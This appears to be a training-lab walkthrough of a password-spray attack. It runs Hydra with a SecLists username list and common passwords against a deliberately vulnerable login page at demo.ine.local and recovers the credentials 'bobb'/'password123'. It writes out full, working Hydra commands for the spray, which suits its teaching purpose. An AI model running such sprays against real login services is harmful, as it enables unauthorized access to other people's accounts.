
Password spraying is a hacking technique where an attacker systematically tries a small set of common passwords across many user accounts to gain unauthorized access, aiming to avoid detection by not triggering account lockouts.
For example, an attacker will use one password (say, abc123) against many different accounts on the application to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

+-------------------------------------------------------------+
|                             Login                           |
|                                                             |
|     +----------------------+          ------------------    |
|     |                      |          |                |    |
|     |      Username        |--------->|  Brute Forced  |    |
|     |                      |          |                |    |
|     +----------------------+          ------------------    |
|                                                             |
|     +----------------------+          ------------------    |
|     |                      |          |                |    |
|     |      Password        |--------->|    Constant    |    |
|     |                      |          |                |    |
|     +----------------------+          ------------------    |
|                                                             |
|                       +-------------+                       |
|                       |   Submit    |                       |
|                       +-------------+                       |
+-------------------------------------------------------------+

https://owasp.org/www-community/attacks/Password_Spraying_Attack


In this lab environment, the user will get access to a Kali instance's GUI. A vulnerable application is running on http://demo.ine.local. Your task is to perform a password-spray attack and find the valid user credentials.

Objective: To perform a password-spray attack and find the valid user credentia

The best tools for this lab are: Hydra and Firefox Web Browser


With this lab exercise, we will got a clear understanding of how attackers can perform a password-spray attack to crack the passwords using tools like Hydra.


Step 1: Open the lab link to access the Kali machine.

Step 2: Verify whether the target machine is up.

Open the terminal and run the command: ping -c 4 demo.ine.local

The target machine is up and running.

Step 3: Open the web browser and visit the URL: http://demo.ine.local

Here, we have a login page. We will be performing our password spray attack on this login page. Let's check the user list.

Step 4: Open the terminal and run the command to check the user list: cat /usr/share/seclists/Usernames/Names/names.txt

Here, you can see the usernames.

zora
zorah
zoran
zorana
zorina
zorine
zouheir
zoya
zsasza
zsa zsa
zuben
zula
zulema
zulfikar
zuri
zuriel
zuzana
zyana
zyg
zygmunt
zylen
root@INE:~#

Now, let's check the tool called "hydra" and perform the attack.

Step 5: Perform the password spray attack using hydra.

Hydra is a popular open-source password-cracking tool. It is designed to perform brute-force attacks, password spray, and dictionary attacks to crack passwords on various network protocols. Hydra supports a wide range of services and protocols, including but not limited to SSH, FTP, HTTP, Telnet, MySQL, and more.

Run the Command: hydra -h

Here, you can see the syntax and various options for the tool.

We will be using the following syntax to perform our attack: hydra -L <username_list_file> -p <password> <server_name> http-post-form "/login:<user_field>=^USER^&<password_field>=^PASS^:valid"

• -L : Specifies the path to a file containing a list of usernames. Replace with the actual file path.
• -p : Specifies the password to be used during the attack. Replace with the actual password you want to test.
• : Specifies the target server's IP address or hostname. Replace with the actual target URL or IP address.
• http-post-form "/login:=^USER^&=^PASS^:valid": Specifies the HTTP POST form parameters for the login. 

Here's a breakdown of the form parameters:
• /login: Specifies the path to the login page on the target server.
• : Replace this with the actual name of the form field where the username is entered.
• ^USER^: This is a placeholder that Hydra will replace with the usernames from the provided list.
• : Replace this with the actual name of the form field where the password is entered.
• ^PASS^: This is a placeholder that Hydra will replace with the passwords from the provided list.
• :valid: Specifies that a login response contains the word "valid."


Let's open the browser and view the source code to get an idea of these fields.

Right-click and click on "Inspect".

Here, we can notice that the action is set to "/login," which is our path to the login page on the target server. Next, the method is set to "post," and the names of the input fields for username and password are "username" and "password," respectively.

<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body style="background-image: url('../static/1.png');">
    <form action="/login" method="post">
        <h1>Log In</h1>
        <label for="username">Username:</label>
        <input id="username" type="text" name="username" required="">
        <label for="password">Password:</label>
        <input id="password" type="password" name="password" required="">
        <input type="submit" value="Log In">
    </form>
</body>
</html>

Now, let's fire the command to perform the attack.

Use the following commmand: hydra -L /usr/share/seclists/Usernames/Names/names.txt -p abc123 demo.ine.local http-post-form "/login:username=^USER^&password=^PASS^:valid"

Note: Here we are using the common password "abc123.". No valid user was found for this password.

Let's try another common password, "password123," and run the command.

Use the following commmand: hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 demo.ine.local http-post-form "/login:username=^USER^&password=^PASS^:valid"

This time we found one valid user with a username of "bobb" and a password of "password123."

Let's login with these credentials.
Username: bobb
password: password123

Enter the credentials and click on "Log In" button. Voila! We successfully logged in.


References
https://owasp.org/www-community/attacks/Password_Spraying_Attack
https://www.kali.org/tools/hydra/



>> Commands Summarization <<

http://demo.ine.local

cat /usr/share/seclists/Usernames/Names/names.txt

hydra -L <username_list_file> -p <password> <server_name> http-post-form "/login:<user_field>=^USER^&<password_field>=^PASS^:valid"

hydra -h
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p abc123 demo.ine.local http-post-form "/login:username=^USER^&password=^PASS^:valid"
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 demo.ine.local http-post-form "/login:username=^USER^&password=^PASS^:valid"



















